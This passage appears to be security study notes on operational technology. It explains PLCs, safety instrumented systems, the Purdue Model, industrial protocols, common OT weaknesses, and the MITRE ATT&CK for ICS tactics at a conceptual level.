				- A Programmable Logic Controller (PLC) is a real-time digital computer used for industrial automation. PLCs are more than just digital computers in industrial control systems due to their robust construction, ease of programming, sequential control capabilities, efficient hardware integration, timers, counters, and highly reliable control functions. They are specifically designed to withstand harsh industrial environments. Industries that utilize PLCs include steel, automotive, energy, chemical, glass, paper, and cement manufacturing.
				- A PLC is a compact, solid-state control computer with customizable instructions tailored for specific tasks. Stored instructions in PLCs enable them to perform various functions such as logic operations, timing, counting, input/output (I/O) control, communication, arithmetic processing, and data management. The introduction of PLCs in industrial settings has largely replaced traditional control mechanisms such as drum sequencers, hard-wired relays, and timers. PLCs continuously monitor sensor inputs and generate corresponding outputs required for actuator operations.
				- PLC System Components:
					- A PLC system consists of three primary modules:
					- CPU Module:
						- The CPU module consists of a central processor and memory components. The processor handles data computations and processing by receiving input signals and generating appropriate output signals. The memory component includes:
							- RAM: Stores user-written programs and temporary data.
							- ROM: Stores operating systems, drivers, and application programs.
							- Retentive Memory: Preserves user programs and data in case of a power outage, allowing the system to resume operations automatically once power is restored.
						- Because of this built-in memory retention, PLCs typically do not require a monitor or keyboard for reprogramming after a power failure.
					- Power Supply Module:
						- The power supply module provides the necessary electrical power to the CPU and I/O modules by converting AC to DC. It is essential for system operation.
						- A 5V DC output from the power supply module powers the PLC’s internal circuitry.
						- Some PLCs also provide a 24V DC output to power external sensors and actuators.
					- I/O Modules:
						- The input and output (I/O) modules serve as the interface between the PLC and external devices such as sensors and actuators. These modules monitor real-time variables such as pressure, temperature, and flow and control the system accordingly.
						- There are different types of I/O modules, including:
							- Digital I/O Module: Connects digital sensors and actuators that function in binary states (ON/OFF). These modules support both AC and DC voltages.
							- Analog I/O Module: Connects sensors and actuators that provide analog signals. It includes an analog-to-digital converter (ADC) to convert analog data into digital format for processing by the CPU.
							- Communication I/O Module: Facilitates data exchange between a remote CPU and a communication network, allowing PLCs to operate in distributed control systems.
				- Importance of PLCs: The primary function of a PLC is to automate machinery and industrial processes with minimal human intervention. PLCs play a critical role in industrial growth, manufacturing, and production by improving efficiency, accuracy, and reliability in automated systems.
			- Basic Process Control System (BPCS):
				- A Basic Process Control System (BPCS) is responsible for process control and monitoring in industrial infrastructure. It responds to input signals from processes and associated equipment, generating output signals that enable operations based on a predefined control strategy. BPCS systems are dynamic and highly adaptable to changing process conditions.
				- BPCSs are used in various control loops, including temperature, batch, pressure, flow, feedback, and feedforward control loops. They are widely implemented in industries such as chemical processing, oil and gas, and food and beverage manufacturing.
				- The primary role of a BPCS is to serve as the first layer of protection against unsafe or hazardous conditions that may affect equipment and processes. These systems help push performance limits to achieve optimal process efficiency. However, unlike safety control systems, BPCSs do not include advanced diagnostic routines for detecting system flaws. Nevertheless, they effectively address operational and business challenges through well-designed control strategies.
				- Key Functions of BPCS:
					- Provides trending and alarm/event logging capabilities.
					- Offers an operator interface (HMI) for monitoring and controlling processes.
					- Optimizes plant operations to improve product quality and efficiency.
					- Generates production data reports for process analysis.
					- Manages sequencing, timing, and coordination of batch process steps, ensuring consistency and efficiency.
					- Includes safety interlocks that prevent equipment operation under unsafe conditions, protecting both personnel and processes.
					- Handles storage and retrieval of recipes, including formulas, process steps, and production parameters, facilitating easy replication of batch processes.
					- Integrates with business and engineering systems, bridging plant floor operations with business management functions.
				- By providing these functionalities, a BPCS enhances industrial automation, ensuring safe, efficient, and high-quality production processes.
			- Safety Instrumented Systems (SIS):
				- A Safety Instrumented System (SIS) is an automated control system designed to protect the manufacturing environment in the event of a hazardous incident. It continuously monitors critical processes and performs specific control functions to either shut down the system or bring it to a predefined safe state, thereby minimizing the adverse effects of an incident.
				- SIS plays a vital role in risk management by providing layers of protection that prevent critical processes from exceeding safe operating conditions. Common examples of SIS include fire and gas systems, safety interlock systems, and safety shutdown systems.
				- How SIS Works:
					- In industrial settings, SIS overrides the Basic Process Control System (BPCS) when the BPCS fails to maintain operations within safe limits. If a process starts operating beyond its normal parameters, the SIS automatically detects and responds to the abnormal condition by either preserving the process state or transitioning it to a safe state (such as initiating an equipment or process shutdown).
					- As an additional safeguard, physical safety mechanisms such as relief valves, rupture disks, and flare systems act as the final layer of protection before a process reaches unsafe operating limits.
					- The functional requirements and efficiency of an SIS are determined using risk assessment methodologies such as Hazard and Operability Studies (HAZOP), Layers of Protection Analysis (LOPA), and risk graphs.
				- Components of an SIS:
					- An SIS operates independently from other control systems and consists of three main components:
					- Field Sensors:
						- Collect and measure process parameters such as temperature, pressure, and flow to determine whether equipment is operating within safe limits.
						- Various sensor types are used, including pneumatic sensors, electric switches, and smart transmitters.
					- Logic Solvers:
						- Process data received from sensors and determine necessary actions.
						- Provide responses for both fail-safe and fault-tolerant situations.
						- Function as controllers that capture sensor signals and execute pre-programmed safety actions by sending commands to final control elements.
					- Final Control Elements:
						- Carry out actions determined by the logic solvers to bring the system to a safe state.
						- Typically include pneumatically operated on-off valves controlled by solenoid valves.
				- Importance of SIS Testing and Cybersecurity:
					- Since no system component is entirely failure-proof, industries must regularly test SIS functionality to ensure reliability. Additionally, assessing the cybersecurity environment of an SIS is crucial for preventing unauthorized access or disruptions that could compromise safety.
					- The primary goal of continuous SIS assessment is to maintain its operational effectiveness and ensure that it performs at its intended design safety levels.
		- IT/OT Convergence (IIoT):
			- IT/OT convergence refers to the integration of IT (Information Technology) computing systems and OT (Operational Technology) monitoring systems. Bridging the gap between IT and OT can enhance overall business operations, leading to faster and more efficient results. IT/OT convergence is not just about merging technologies but also about aligning teams and operations.
			- Traditionally, IT and OT teams have operated in separate domains. IT teams focus on internal processes such as programming, system updates, and cybersecurity, whereas OT teams oversee maintenance, management, and the operation of industrial equipment and personnel. Effective IT/OT integration does not mean turning IT engineers into field/plant engineers or vice versa; rather, it fosters collaboration between the two to enhance security, efficiency, quality, and productivity.
			- Benefits of IT/OT Convergence:
				- IT/OT convergence enables smart manufacturing, also known as Industry 4.0, where IoT applications are integrated into industrial operations. The use of IoT in industrial settings for monitoring supply chains, manufacturing, and management systems is referred to as the Industrial Internet of Things (IIoT).
				- The key benefits of IT/OT convergence include:
					- Enhanced Decision-Making: Integrating OT data into business intelligence solutions improves decision-making processes.
					- Improved Automation: IT/OT integration optimizes business workflows and industrial control operations, enhancing automation.
					- Accelerated Business Output: Streamlining development projects through IT/OT convergence speeds up business output.
					- Cost Reduction: Merging IT and OT reduces technological and organizational overhead.
					- Risk Mitigation: Improved productivity, security, and reliability reduce operational risks while ensuring scalability.
					- Increased Agility: Integrated systems allow organizations to respond more quickly to market changes and operational demands, providing a competitive edge.
					- Predictive Maintenance: IT systems can analyze OT device data to anticipate equipment failures, reducing downtime, maintenance costs, and extending equipment lifespan.
					- Better Quality Control: IT/OT integration enhances monitoring and control of production quality, ensuring consistency and higher product standards.
					- Simplified Compliance and Reporting: Integration aids compliance with regulatory requirements by improving data collection, analysis, and reporting. This ensures data accuracy, traceability, and accessibility for audits.
					- Scalability: Unified IT and OT systems can be easily scaled up or down based on business needs, facilitating growth and adaptation without extensive infrastructure changes.
			- By integrating IT and OT, organizations can create a more resilient, efficient, and future-ready operational framework.
		- The Purdue Model:
			- The Purdue Model is derived from the Purdue Enterprise Reference Architecture (PERA), a widely used conceptual framework that defines the internal connections and dependencies of key components within Industrial Control System (ICS) networks. Also known as the Industrial Automation and Control System Reference Model, the Purdue Model consists of three primary zones:
				- Enterprise Zone (IT)
				- Manufacturing Zone (OT)
				- Industrial Demilitarized Zone (IDMZ)
			- The IDMZ acts as a security buffer between the OT and IT environments, preventing direct communication while ensuring network segmentation. This additional security layer helps contain potential threats and ensures uninterrupted industrial operations. Each zone is further divided into multiple operational levels, as detailed below:
			- Enterprise Zone (IT Systems):
				- The enterprise zone includes IT systems responsible for supply chain management, business operations, and scheduling. It houses data centers, users, and cloud access infrastructure. This zone consists of two levels:
				- Level 5: Enterprise Network:
					- This level encompasses corporate IT networks that handle business operations such as B2B (business-to-business) and B2C (business-to-customer) services. It manages internet connectivity and oversees IT infrastructure. Additionally, enterprise networks aggregate data from various production sites to monitor inventory and overall manufacturing performance.
				- Level 4: Business Logistics Systems:
					- At this level, IT systems supporting production processes—such as scheduling, planning, and logistics—are managed. Systems at this level include application servers, file servers, database servers, supervisory systems, and email clients.
			- Manufacturing Zone (OT Systems):
				- This zone contains all operational technology (OT) systems, including industrial devices, networks, control systems, and monitoring solutions. It is divided into four levels:
				- Level 3: Operational Systems / Site Operations:
					- This level oversees production management, plant monitoring, and control functions. It ensures efficient production workflows and desired output. Key systems include:
						- Plant performance management
						- Production scheduling
						- Batch management
						- Quality assurance
						- Data historians
						- Manufacturing Execution Systems (MES)
						- Process optimization
					- Data from lower levels is aggregated here and can be shared with higher levels for decision-making.
				- Level 2: Control Systems / Area Supervisory Controls:
					- This level handles supervisory control and real-time monitoring of physical processes. Key components include:
						- Distributed Control Systems (DCS)
						- Supervisory Control and Data Acquisition (SCADA)
						- Human-Machine Interfaces (HMIs)
						- Engineering workstations
						- Programmable Logic Controllers (PLCs) (with supervisory functionality)
				- Level 1: Basic Controls / Intelligent Devices:
					- At this level, direct control and process adjustments take place. Basic control functions include:
						- Starting motors
						- Opening valves
						- Actuating mechanical systems
					- Key devices include:
						- Process sensors (temperature, pressure, etc.)
						- Intelligent Electronic Devices (IEDs)
						- Remote Terminal Units (RTUs)
						- Proportional Integral Derivative (PID) controllers
						- Variable Frequency Drives (VFDs)
						- PLCs (used here for control, rather than supervision)
				- Level 0: Physical Process:
					- This is the foundational level where actual manufacturing occurs. It involves the physical machinery, sensors, actuators, and industrial equipment executing production tasks. Since higher levels monitor and control these operations, this level is also referred to as Equipment Under Control (EUC). Even minor malfunctions at this stage can significantly impact overall production.
			- Industrial Demilitarized Zone (IDMZ):
				- The IDMZ serves as a security buffer between the IT and OT systems, facilitating secure communication while isolating potential threats. If a cyberattack or system failure occurs, the IDMZ helps contain the issue, preventing disruption to production. Typical IDMZ components include:
					- Microsoft Domain Controllers
					- Database Replication Servers
					- Proxy Servers
				- This structured approach enhances network security, operational reliability, and efficiency across industrial environments.
		- OT Technologies and Protocols:
			- Industrial network protocols enable real-time interconnectivity and information exchange between industrial systems and zones. These protocols are deployed across ICS networks in various industries. To understand an industrial network, a security engineer must be familiar with the underlying protocols. The key communication technologies and protocols within the OT network, as defined by the Purdue Model (ISA-95), include the following:
			- Protocols Used in Levels 4 and 5:
				- DCOM (Distributed Component Object Model): A proprietary Microsoft technology that enables secure and reliable communication between software components over a network.
				- FTP/SFTP: FTP establishes connections for file transfers between servers and computers. SFTP provides secure file transfers by verifying client identity before exchanging data.
				- GE-SRTP (Service Request Transport Protocol): Developed by GE Intelligent Platforms, this protocol facilitates data transfer from PLCs and is used on select GE PLCs to execute digital commands.
				- IPv4/IPv6: IPv4 is a connectionless protocol used in packet-switched networks, while IPv6 enhances internetworking by enabling end-to-end datagram transmission across multiple IP networks.
				- OPC UA: A secure, platform-independent protocol that ensures reliable data exchange between manufacturing devices and enterprise systems.
				- TCP/IP: A suite of communication protocols that enable networking device interconnection over the Internet.
				- SMTP, HTTP/HTTPS: Standard Internet protocols for email communication, file transfers, and data transmission across enterprises.
				- Wi-Fi: A widely used wireless LAN technology. The most common standard, 802.11n, supports speeds up to 600 Mbps and has a range of approximately 50 meters.
			- Protocols Used in Level 3:
				- CC-Link (Control and Communications Link): An open industrial network that enables devices from different manufacturers to communicate. It is commonly used in machine control, process control, and building automation.
				- HSCP (Hybrid Secure Copy Protocol): Designed for transmitting large files at high speed over long-distance and wideband infrastructure.
				- ICCP (Inter-Control Center Communications Protocol) (IEC 60870-6): A set of standards and protocols used for ICS and SCADA communication in power system automation.
				- IEC 61850: A standardized protocol that enables interoperability and communication between Intelligent Electronic Devices (IEDs) in electrical substations.
				- IEC 60870-5-104: A telecontrol protocol widely used in electrical engineering and power system automation, particularly in utilities.
				- ISA/IEC 62443: A cybersecurity framework that addresses and mitigates security vulnerabilities in industrial automation and control systems.
				- Modbus: A serial communication protocol used with PLCs, enabling communication between multiple devices on the same network.
				- NTP (Network Time Protocol): Used for clock synchronization between computer systems over packet-switched and variable-latency data networks.
				- Profinet: A communication protocol for exchanging data between controllers (e.g., PLCs) and field devices (e.g., RFID readers).
				- SuiteLink: A TCP/IP-based protocol that runs as a service on Windows operating systems, primarily used in industrial applications requiring high throughput and reliability.
				- TASE.2 (IEC 60870-6): An open communication protocol that facilitates the exchange of time-critical information between control systems over WAN and LAN.
				- ControlNet: A real-time control protocol used to collect data from and send instructions to field devices. It provides high-speed transmission and is robust in noisy environments.
				- Profibus PA/DP: Used for plant-level automation. Profibus DP (Decentralized Peripherals) connects sensors and actuators to a central controller, while Profibus PA (Process Automation) monitors measuring equipment through a process control system.
			- Protocols Used in Level 2:
				- 6LoWPAN (IPv6 over Low-Power Personal Area Networks): An Internet Protocol used for communication between low-power, resource-constrained devices, primarily in home and building automation.
				- DNP3 (Distributed Network Protocol 3): A communication protocol used for interconnecting components in process automation systems.
				- DNS/DNSSEC (Domain Name System Security Extensions): Enhances DNS security by authenticating DNS response data.
				- FTE (Fault-Tolerant Ethernet): Provides network redundancy by connecting each node twice to a single LAN via dual network interfaces.
				- HART-IP: Integrates WirelessHART gateways and HART multiplexers efficiently for transmitting digital information.
				- IEC 60870-5-101/104: An extension of IEC 101 with modifications in transport, network, link, and physical layer services, enabling communication between control stations and substations over a standard TCP/IP network.
				- SOAP (Simple Object Access Protocol): A messaging protocol that facilitates structured data exchange between clients and servers using the XML message format.
				- DeviceNet: Connects simple industrial devices (e.g., sensors and actuators) with higher-level devices (e.g., PLCs) using Controller Area Network (CAN) technology.
				- AS-Interface (AS-i): A cost-effective network designed for connecting binary devices, such as sensors and actuators, in automation applications.
			- Protocols Used in Levels 0 and 1:
				- BACnet (Building Automation and Control Network): A data communication protocol for building automation and control networks, implementing standards such as ASHRAE, ANSI, and ISO 16484-5.
				- EtherCAT (Ethernet for Control Automation Technology): An Ethernet-based fieldbus system designed for both hard and soft real-time computing in automation technology.
				- CANopen: A high-level communication protocol based on the CAN (Controller Area Network) standard, used in embedded networking applications such as vehicle networks.
				- Crimson: A programming platform used for various Red Lion products, including G3 and G3 Kadet series HMIs, Data Station Plus, Modular Controller, and the Productivity Station.
				- DeviceNet: A variant of the Common Industrial Protocol (CIP) used in automation for interconnecting control devices to exchange data.
				- Zigbee: A short-range wireless communication protocol based on the IEEE 802.15.4 standard. It is used for low-power, low-data-rate applications within a range of 10–100 meters, such as home automation and industrial monitoring.
				- ISA SP100 (ISA100): A wireless standard developed for industrial manufacturing environments and process automation.
				- MELSEC-Q: An automation network solution by Mitsubishi that integrates different levels of industrial networks, including CC-Link IE, offering high-speed, large-capacity Ethernet-based communication.
				- Niagara Fox: A proprietary building automation protocol used for communication between Niagara software systems developed by Tridium.
				- Omron FINS: A protocol used for data transfer and remote communication between Omron PLCs over Ethernet networks. It also allows integration with devices like FieldServers.
				- PCWorx: A programming platform used in ICS (Industrial Control Systems), supporting various ICS and common TCP/IP protocols for inline controllers (ILCs).
				- Profibus: A more complex protocol than Modbus, designed to address interoperability challenges in process and factory automation.
				- Sercos II (Serial Real-time Communication System): A digital drive interface used in high-specification industrial machines, particularly in motion control applications.
				- S7 Communication: A Siemens proprietary protocol for communication between Siemens S7-300/400 PLCs, enabling PLC programming and SCADA data access.
				- WiMAX (Worldwide Interoperability for Microwave Access): A wireless metropolitan area network (WMAN) protocol based on IEEE 802.16. It operates at frequencies between 2.5 GHz and 5.8 GHz, with data transfer rates up to 40 Mbps.
				- FOUNDATION Fieldbus: A fully digital communication protocol commonly used in process industries. It provides a unified infrastructure for linking field instruments, such as sensors and actuators, to control systems.
		- Challenges of OT:
			- Operational Technology (OT) plays a vital role in several critical infrastructure sectors, such as power plants, water utilities, and healthcare. However, many OT systems still operate on outdated software and obsolete hardware, making them highly vulnerable to cyber threats such as phishing, espionage, and ransomware attacks. These attacks can be devastating, impacting essential products and services. To mitigate these vulnerabilities, OT systems must undergo thorough security assessments and implement appropriate security tools and strategies.
			- Below are some key challenges and risks that make OT systems susceptible to threats:
				- Lack of visibility: A broader cybersecurity perspective in OT networks enhances security by enabling rapid responses to potential threats. However, many organizations lack clear visibility into their cybersecurity landscape, making it difficult for security teams to detect unusual behaviors and anomalies.
				- Weak or plain-text passwords: Many industrial networks rely on weak or plain-text passwords, leading to inadequate authentication and leaving systems exposed to cyber-reconnaissance attacks.
				- Network complexity: OT environments are inherently complex, consisting of numerous interconnected devices, each with distinct security requirements. This complexity makes comprehensive security management difficult.
				- Legacy technology: Many OT systems rely on outdated technologies that lack modern security measures such as encryption and strong authentication, leaving them vulnerable to cyberattacks. Additionally, integrating modern security solutions into legacy systems poses significant challenges.
				- Lack of antivirus protection: Industries using outdated OT systems often lack antivirus protection capable of automatically updating threat signatures, making them susceptible to malware infections.
				- Shortage of skilled security professionals: The cybersecurity skills gap is a major concern, as many organizations lack experienced security professionals who can identify threats and implement necessary security controls.
				- Rapid pace of technological change: Keeping up with the rapid advancements in cybersecurity is a significant challenge. Slow digital transformation can leave OT systems outdated and vulnerable.
				- Outdated firmware and software: Many OT devices, such as Programmable Logic Controllers (PLCs), run on outdated firmware, making them easy targets for modern cyber threats.
				- Haphazard modernization: While OT systems must evolve with technological advancements, integrating new technologies into legacy infrastructure is complex and time-consuming. This slow transition can disrupt operations and introduce security risks.
				- Insecure connections: OT systems frequently communicate over public or unencrypted Wi-Fi networks within IT environments, increasing susceptibility to man-in-the-middle attacks.
				- Presence of rogue devices: Many industrial environments have unauthorized or unknown devices connected to their networks, which can introduce vulnerabilities and potential attack vectors.
				- OT-IT convergence challenges: As OT systems become increasingly integrated with IT networks, they inherit IT-related vulnerabilities. Additionally, IT security teams may lack expertise in OT-specific systems and protocols, further complicating security efforts.
				- Organizational security challenges: Organizations often implement different security architectures for IT and OT, which can lead to security gaps that attackers may exploit.
				- Proprietary software and unique production networks: Many industrial environments rely on proprietary hardware and software configurations based on industry-specific standards. This dependence makes software updates and patching difficult, especially when multiple vendors are involved.
				- Vulnerable communication protocols: OT uses communication protocols such as Modbus and Profinet to manage controllers, actuators, and sensors. These protocols often lack built-in security features such as authentication and anomaly detection, making them vulnerable to exploitation.
				- Remote management risks: Industrial sites use remote access protocols like RDP, VNC, and SSH. If an attacker gains access to these remote management tools, they can manipulate configurations and compromise equipment functionality.
				- Insufficient network segmentation: Poorly segmented OT networks allow attackers to move laterally within the system once they gain entry, increasing the potential impact of a breach.
				- Physical security risks: Many OT systems are located in remote or physically unsecure locations, making them susceptible to unauthorized physical access and tampering.
				- Vendor dependencies: Organizations often rely on third-party vendors for hardware, software, and ongoing support. If these vendors do not follow strict cybersecurity practices, they can introduce security vulnerabilities.
				- Resource constraints: Many OT systems have limited processing power and memory, restricting the implementation of advanced security features such as encryption and endpoint detection.
				- Lack of encryption: Data transmitted between OT devices is often unencrypted, making it susceptible to interception and manipulation by attackers.
				- Data integrity concerns: Cyberattacks that alter critical data, such as sensor readings, can lead to disastrous consequences, as false information can trigger incorrect operational decisions.
		- OT Vulnerabilities:
			- Operational Technology (OT) systems are becoming increasingly interconnected with Information Technology (IT) networks. As OT/IT convergence grows, the attack surface of OT systems expands. IT networks frequently experience cyberattacks, making OT systems vulnerable when connected to them. Attackers can exploit IT network vulnerabilities to launch attacks on OT environments.
			- Below are some common OT vulnerabilities:
				- Publicly Accessible OT Systems:
					- OT systems are directly connected to the internet, allowing third-party vendors to perform remote maintenance and diagnostics.
					- These systems often lack modern security controls.
					- Attackers can perform password brute-force attacks or probe OT systems to disable or disrupt their functions.
				- Insecure Remote Connections:
					- Corporate networks use jump boxes to establish remote connectivity with OT networks.
					- Attackers can exploit vulnerabilities in jump boxes to gain unauthorized remote access to OT systems.
				- Missing Security Updates:
					- Outdated software increases risks and creates opportunities for attackers to compromise OT systems.
				- Weak Passwords:
					- Operators and administrators often use default usernames and passwords, which are easily guessable.
					- If default vendor credentials for embedded devices and management interfaces are not changed, attackers can gain access to OT systems.
				- Insecure Firewall Configurations:
					- Misconfigured access rules allow unnecessary communication between corporate IT and OT networks.
					- Support teams may grant excessive access permissions to firewall management interfaces.
					- Insecure firewalls can propagate security threats to OT networks, making them vulnerable to attacks.
				- OT Systems Placed Within the Corporate IT Network:
					- Corporate systems are interconnected with OT networks for data access and export to third-party management systems.
					- OT systems such as control stations and reporting servers are sometimes placed within the IT network.
					- A compromised IT system can be leveraged to gain access to the OT network.
				- Insufficient Security for Corporate IT Networks from OT Systems:
					- Attacks can originate from OT systems, which often use outdated legacy software and allow remote access.
					- Attackers can exploit insecure OT devices to gain unauthorized access to corporate IT systems.
				- Lack of Segmentation Within OT Networks:
					- Many OT networks have a flat, unsegmented configuration, assuming all systems hold equal importance.
					- Compromising a single device can expose the entire OT network to threats.
				- Lack of Encryption and Authentication in Wireless OT Networks:
					- Wireless OT equipment often relies on outdated or insecure security protocols.
					- Attackers can conduct sniffing attacks and bypass authentication mechanisms.
				- Unrestricted Outbound Internet Access from OT Networks:
					- OT networks allow direct outbound connections for remote patching and maintenance.
					- Unpatched and insecure OT devices with direct internet access are at higher risk of malware infections.
					- These networks are susceptible to command-and-control (C2) attacks.
		- MITRE ATT&CK for ICS (attack.mitre.org):
			- MITRE ATT&CK for ICS serves as a valuable knowledge base for ICS security teams and vendors. It helps them understand an attacker’s actions against OT systems and develop effective defense strategies to mitigate threats. Additionally, it assists security teams in illustrating and analyzing an attacker’s behavior after a compromise.
			- MITRE ATT&CK for ICS outlines various tactics, which are discussed below.
				- Initial Access:
					- This refers to the methods and techniques attackers use to establish initial access within a targeted ICS environment. Attackers may compromise OT assets, websites, IT resources, or external services to infiltrate an ICS network.
					- Some common techniques used by attackers to gain initial access include:
						- Drive-by Compromise: Attackers exploit vulnerabilities in a user’s web browser, tricking them into visiting a compromised website during a normal browsing session to gain access to the OT system.
						- Exploiting a Public-Facing Application: Attackers target known vulnerabilities in internet-facing applications—such as those used for remote monitoring and management—to infiltrate an OT network.
						- Exploiting Remote Services: Attackers manipulate known vulnerabilities in applications by leveraging error messages generated by the OS, programs, or the kernel to carry out further attacks on remote services.
					- Additional Techniques for Initial Access in ICS:
						- Attackers may also employ the following techniques to gain unauthorized access to an ICS environment:
						- External remote services
						- Internet-accessible devices
						- Remote services
						- Replication through removable media
						- Rogue master
						- Spear-phishing attachment
						- Supply-chain compromise
						- Transient cyber assets
						- Wireless compromise
				- Execution:
					- Execution refers to an attacker’s attempt to run malicious code, manipulate data, or perform unauthorized system functions. Attackers use various techniques to execute malicious code within a device or asset in an ICS environment.
					- Some common techniques associated with this stage include:
						- Changing the Operating Mode: Attackers manipulate the operating modes of a controller within the infrastructure—such as enabling program downloads—to gain additional access to various OT functionalities.
						- Command-Line Interface (CLI): Attackers use the CLI to execute malicious commands and interact with an OT system. This allows them to install and run malicious programs and carry out harmful operations while avoiding detection.
						- Execution through APIs: Attackers inject code into APIs, leveraging them to perform specific system functions when called by associated software.
					- Additional Execution Techniques:
						- Attackers may also use the following techniques to execute malicious actions:
						- Graphical User Interface (GUI)
						- Hooking
						- Modify Controller Tasking
						- Native API
						- Scripting
						- User Execution
				- Persistence:
					- Attackers use persistence techniques to maintain access within an ICS environment, even after a device restart or communication interruption.
					- The following are some of the techniques attackers may use at this stage:
						- Modifying a Program: Attackers manipulate a controller in an OT system by altering or attaching a program to it. This enables them to change how the controller communicates with other devices or processes within the environment.
						- Module Firmware: Attackers install malicious firmware on hardware devices to maintain access to systems and leave a persistent footprint for long-term attacks.
						- Project File Infection: Attackers inject malicious code into file dependencies, such as objects or variables required for programmable logic controllers (PLCs) to function. They often exploit default PLC functions to sustain their access.
					- Additional Persistence Techniques:
						- Attackers may also use the following methods to maintain persistence:
						- System Firmware
						- Valid Accounts
				- Privilege Escalation:
					- Privilege escalation enables an attacker to gain higher-level access and authorizations, allowing them to carry out further malicious activities within an ICS system or network.
					- Some common techniques attackers use to escalate privileges include:
						- Exploiting Software: Attackers exploit known software vulnerabilities, taking advantage of programming errors to elevate their privileges.
						- Hooking: Attackers intercept and manipulate APIs within different processes, redirecting or modifying their behavior to gain elevated privileges.
				- Evasion:
					- Attackers use evasion techniques to bypass conventional defense mechanisms and avoid detection during their operations.
					- Some common techniques used to evade detection include:
						- Removing Indicators: Attackers erase traces of their activity from a compromised host to cover their tracks and avoid detection.
						- Rootkits: Attackers install rootkits to hide malicious services, network connections, and system drivers, making their presence undetectable.
						- Changing the Operator Mode: Attackers modify a controller’s operating mode to gain unauthorized access and control over various system functionalities.
					- Additional Evasion Techniques:
						- Attackers may also use the following methods to evade detection:
						- Exploitation of Software Vulnerabilities
						- Masquerading
						- Spoofed Reporting Messages
				- Discovery:
					- Discovery is the process of gathering information about an ICS environment to assess and identify target assets.
					- The following techniques can be used to collect information about an ICS environment:
						- Enumerating Network Connections: Attackers analyze communication patterns between network devices to understand their interactions and potential vulnerabilities.
						- Network Sniffing: Attackers capture and monitor network traffic to gather critical information, such as protocols in use, source and destination addresses, and other key data.
						- Identifying Remote Systems: Attackers obtain details about other systems on the network—such as hostnames, IP addresses, and system attributes—to facilitate further malicious activities.
					- Additional Discovery Techniques:
						- Attackers may also use the following methods for information gathering:
						- Remote System Information Discovery
						- Wireless Sniffing
				- Lateral Movement:
					- Attackers use lateral movement techniques to navigate through a compromised ICS environment, leveraging their existing access to expand their control.
					- Some common techniques used for lateral movement include:
						- Default Credentials: Attackers exploit built-in or hardcoded credentials within control systems to perform administrative tasks and gain further access.
						- Program Download: Attackers upload and execute a malicious user program within a controller by initiating a program download.
						- Remote Services: Attackers abuse remote services to move laterally across network assets and components, extending their reach within the ICS environment.
					- Additional Lateral Movement Techniques:
						- Attackers may also use the following methods to move across a network:
						- Exploiting Remote Services
						- Lateral Tool Transfer
						- Valid Accounts
				- Collection:
					- Collection refers to the various methods attackers use to gather information and gain insights into the data and domains of an ICS infrastructure. Attackers may employ the following techniques to collect information:
						- Automated Collection: Attackers use tools or scripts to automatically gather information from an ICS environment.
						- Information Repositories: Attackers target information repositories to obtain sensitive details, such as control system layouts and specifications.
						- I/O Image: Attackers access a PLC’s memory by extracting its I/O image, enabling them to conduct further malicious activities.
					- Additional Data Collection Techniques:
						- Attackers may also use the following methods to gather information:
						- Detecting the Operating Mode
						- Man-in-the-Middle Attack
						- Monitoring the Process State
						- Point and Tag Identification
						- Program Upload
						- Screen Capture
						- Wireless Sniffing
				- Command and Control:
					- Attackers use command and control (C2) techniques to deactivate, manipulate, or exploit physical control processes within a targeted ICS environment.
					- Some common techniques used for command and control include:
						- Frequently Used Ports: Attackers communicate over commonly used ports, such as 80 (HTTP) and 443 (HTTPS), to blend in with normal traffic and evade conventional detection mechanisms.
						- Connection Proxy: Attackers use a connection proxy to route traffic through intermediary systems, enabling them to control network communications across the ICS environment while masking their presence.
						- Standard Application-Layer Protocols: Attackers leverage common application-layer protocols, such as HTTPS, Telnet, and Remote Desktop Protocol (RDP), to disguise their activities and maintain control over compromised systems.
				- Inhibit Response Function:
					- The inhibition of response functions refers to the various techniques attackers use to disrupt or prevent security responses to hazards, failures, or other critical events in an ICS environment.
					- Some common techniques associated with this tactic include:
						- Activate Firmware Update Mode: Attackers enable firmware update mode to disrupt normal response functionalities during a security event.
						- Block Command Messages: Attackers intercept or block command messages before they reach control systems, preventing critical instructions from being executed.
						- Block Reporting Messages: Attackers stop or disrupt reporting messages from industrial systems, preventing alerts from reaching their destination and allowing malicious activities to go undetected.
					- Additional Techniques for Inhibiting Response Functions:
						- Attackers may also use the following methods to disrupt system responses:
						- Alarm Suppression
						- Blocking Serial COM
						- Data Destruction
						- Denial of Service (DoS)
						- Device Restart/Shutdown
						- Control I/O Image
						- Changing Alarm Settings
						- Rootkit
						- Service Stop
						- System Firmware
				- Impair Process Control:
					- Attackers use this tactic to disable, exploit, or manipulate physical control processes within a targeted ICS environment.
					- Some common techniques associated with this tactic include:
						- I/O Brute-Forcing: Attackers systematically attempt different I/O addresses to gain control over process functionality without directly targeting a specific interface.
						- Altering Parameters: Attackers manipulate control systems by modifying instruction parameters through unauthorized programming, affecting operational behavior.
						- Module Firmware: Attackers inject malicious firmware into a device, reprogramming it to perform unauthorized or harmful actions.
					- Additional Techniques for Impairing Process Control:
						- Attackers may also use the following methods to disrupt process control:
						- Spoofed Reporting Messages
						- Unauthorized Command Messages
				- Impact:
					- Impact refers to the techniques attackers use to damage, disrupt, or gain control over data and systems within a targeted ICS environment and its surroundings.
					- Some common techniques associated with this tactic include:
						- Damage to Property: Attackers can cause significant physical damage to infrastructure and surrounding environments by executing targeted attacks on ICS components.
						- Loss of Availability: Attackers disrupt industrial processes, rendering them unresponsive to associated systems and connections.
						- Denial of Control: Attackers manipulate system controls to interfere with communication between operators and process control mechanisms, leading to operational disruptions.
					- Additional Techniques for Impact:
						- Attackers may also use the following methods to compromise ICS environments:
						- Denial of View
						- Loss of Control
						- Loss of Productivity and Revenue
						- Loss of Protection
						- Loss of Safety
						- Loss of View
						- Manipulation of Control
						- Manipulation of View
						- Theft of Operational Information
		- OT Threats:
			- With the convergence of OT and IT, OT systems are now being used for purposes beyond their original design. These systems are increasingly integrated with IT networks and exposed to the Internet, making them vulnerable to cyber threats. Most OT systems rely on outdated software with minimal or no security measures, creating potential entry points for cybercriminals to access corporate IT networks and OT infrastructure. Additionally, OT networks connect all machines and production infrastructure, making them susceptible to sophisticated cyberattacks that can even cause physical damage.
			- Below are some critical threats faced by OT networks:
				- Maintenance and Administrative Threats: Attackers exploit zero-day vulnerabilities in OT network maintenance and administration. By doing so, they can inject and spread malware into IT systems and target connected industrial control systems such as SCADA and PLCs.
				- Data Leakage: Cybercriminals may exploit IT systems linked to the OT network to gain access to the IT/OT gateway and steal critical operational data, such as configuration files.
